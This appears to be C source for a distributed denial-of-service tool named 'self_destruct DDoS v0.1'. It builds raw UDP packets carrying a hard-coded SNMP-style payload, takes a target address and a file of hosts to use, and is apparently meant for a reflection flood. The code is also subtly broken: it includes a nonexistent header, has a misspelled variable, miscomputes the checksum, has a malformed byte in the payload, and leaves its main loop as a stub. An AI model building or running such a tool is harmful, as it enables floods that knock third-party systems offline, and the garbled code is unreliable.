#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in_sysm.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

struct sockaddr_in dest;

int sok,i=0, count=0, loop=0, lcount=0;

char *source, *filename;
char c;

FILE *hostfile;
char buf[32];
u_long address[2048];
int num = 0,n;
char udpkill[] =
"\x30\x24\x02\x01\x01\x04\x06\070\x75\x62\x6c\x69\x63\xa5\x17\x02"
"\x04\x7b\x73\xcc\x13\x02\x01\x00\x02\x01\x64\x30\x09\x30\x07\x06"
"\x03\x2b\x06\x01\x05";

in_cksum (unsigned short *ptr, int nbytes)
{
        register long sum;
        u_short oddbyte;
        register u_short answer;
        
        sum = 0;
        while (nbytes > 1)
                {
                sum += *ptr++;
                nbytes -=2;
                }
        if (nbytes == 1)
                {
                oddbyt = 0;
                *((u_char *) & oddbyte) = *(u_char *) ptr;
                sum += oddbyte;
                }
        
        sum = (sum >> 16) + (sum & 0xfffff); /*add high-16 to low-16 */
        sum += (sum >> 16); /* add carry */
        answer = -sum; /* ones-complement, then truncate to 16 bits */
        return (answer);
}

void usage (void)
{
        printf("self_destruct DDoS v0.1\n");
        printf("Usage: self_destruct [-t target ip_addr] [-f host file] [-l loop count] \n");
}

void loadfile (void)
{
        if ((hostfile = fopen(filename, "r")) == NULL)
        {
                perror("Opening hostfile");
                exit(-1);
        }
        
        while (fgets(buf, sizeof buf, hostfile) != NULL)
        {
                char *p;
                int valid;
                
                /* skip over comments/blank lines */
                if (buf[0] == '#'|| buf[0] == '\n') continue;
                
                /* get rid of newline */
                buf[strlen(buf) -1] = '\0';
                
                /* do stuff */
        }
}